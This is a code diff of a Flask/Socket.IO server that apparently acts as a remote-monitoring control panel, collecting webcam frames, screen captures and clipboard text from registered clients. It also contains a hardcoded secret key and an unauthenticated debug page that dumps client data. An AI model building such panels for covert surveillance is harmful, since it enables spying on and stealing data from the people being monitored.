@@ -1,15 +1,21 @@
 from flask import Flask, request, Response, render_template
+from flask_socketio import SocketIO, emit
+
 import cv2
 import numpy as np
 from random import randint
 import base64
 import os
+import io
 
 app = Flask(__name__)
+app.config['SECRET_KEY'] = 'NeverGonnaGiveYouUp+_#+_($_*)'
+socketio = SocketIO(app)
+
 last_frame = {}
 screen_last_frame = {}
-
 clients = {}
+
 def uuid_to_client(client_id):
 	for key, value in clients.items():
 		if str(value.get('clientId')) == str(client_id):
@@ -17,7 +23,7 @@ def uuid_to_client(client_id):
 
 @app.route('/', methods=['GET'])
 def mainSite():
-	return render_template('main.html', client = clients, Maxclients = len(clients))
+	return render_template('main.html', clients = clients, Maxclients = len(clients))
 
 @app.route('/client/<int:clientId>', methods=['GET'])
 def client1(clientId):
@@ -50,70 +56,54 @@ def regclient():
 def debugpage():
 	return f"Client: {clients}"
 
-@app.route('/send_camera', methods=['GET', 'POST'])
-def send_camera():
-	global last_frame
-	if request.method == 'POST':
-		frame_data = request.data
-		frame = cv2.imdecode(np.frombuffer(frame_data, np.uint8), cv2.IMREAD_COLOR)
-		if frame is not None:
-			last_frame[request.args.get('id')] = frame
 
-		return Response(status=200)
+@socketio.on('send_camera')
+def send_camera(json):
+	clientId = json['clientId']
+	image = json['image']
+	last_frame[clientId] = image
+	return Response(status=200)
+
 
 @app.route('/get_camera_frame', methods=['GET'])
 def get_camera_frame():
-	global last_frame
-	clientid = request.args.get('id')
-	try:
-		if last_frame[clientid] is not None:
-			_, encoded_frame = cv2.imencode('.jpg', last_frame[clientid])
-			response = Response(encoded_frame.tobytes(), mimetype='image/jpeg')
-			response.headers['Cache-Control'] = 'no-store, no-cache, must-revalidate, max-age=0'
-			return response
-	except:
-		pass
+	if last_frame[request.args.get('id')]:
+		response = Response(io.BytesIO(last_frame[request.args.get('id')]), mimetype='image/jpeg')
+		response.headers['Cache-Control'] = 'no-store, no-cache, must-revalidate, max-age=0'
+		return response
+		#return Response(io.BytesIO(screen_last_frame[request.args.get('id')]), mimetype='image/png', max_age=0)
+	else:
+		return 'No camera image'
 
 
-	return "No frame available"
-
-@app.route('/send_screen', methods=['POST'])
-def send_screen():
-	global screen_last_frame
-	frame_data = request.data
-	frame = cv2.imdecode(np.frombuffer(frame_data, np.uint8), cv2.IMREAD_COLOR)
-
-	if frame is not None:
-		frame_rgb = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
-		screen_last_frame[request.args.get('id')] = frame_rgb
-
+@socketio.on('send_screen')
+def send_screen(json):
+	clientId = json['clientId']
+	image = json['image']
+	screen_last_frame[clientId] = image
 	return Response(status=200)
 
 @app.route('/get_screen_frame', methods=['GET'])
-def get_screen_frame():
-	global screen_last_frame
-	try:
-		if screen_last_frame[request.args.get('id')] is not None:
-			_, encoded_frame = cv2.imencode('.jpg', screen_last_frame[request.args.get('id')])
-			response = Response(encoded_frame.tobytes(), mimetype='image/jpeg')
-			response.headers['Cache-Control'] = 'no-store, no-cache, must-revalidate, max-age=0'
-			return response
-	except:
-		pass
+def get_screen():
+	if screen_last_frame[request.args.get('id')]:
+		response = Response(io.BytesIO(screen_last_frame[request.args.get('id')]), mimetype='image/jpeg')
+		response.headers['Cache-Control'] = 'no-store, no-cache, must-revalidate, max-age=0'
+		return response
+		#return Response(io.BytesIO(screen_last_frame[request.args.get('id')]), mimetype='image/png', max_age=0)
+	else:
+		return 'No screen image'
 
-	return "No frame available"
 
-@app.route('/send_clipboard', methods=['POST'])
-def send_console():
-	clientId = request.args.get('id')
+@socketio.on('clipboard')
+def send_clipboard(json):
+	clientId = json['clientId']
 	clientid = uuid_to_client(clientId)
-	message = request.json['text']
+	message = json['text']
 	if clientid in clients:
 		clipboard = clients[clientid]['clientClipboard']
 		clients[clientid]['clientClipboard'] = clipboard + message
-		return "Message sent to client clipboard successfully"
 	else:
-		return f"id {clientId} not in clients!"
+		pass
 
 @app.route('/get_clipboard', methods=['GET'])
 def get_console():
@@ -145,4 +135,5 @@ def upload_file():
 
 
 if __name__ == '__main__':
-	app.run(host='0.0.0.0', port=5000, debug=True)
+	#app.run(host='0.0.0.0', port=5000, debug=True)
+	socketio.run(app, host='0.0.0.0', port=20075)
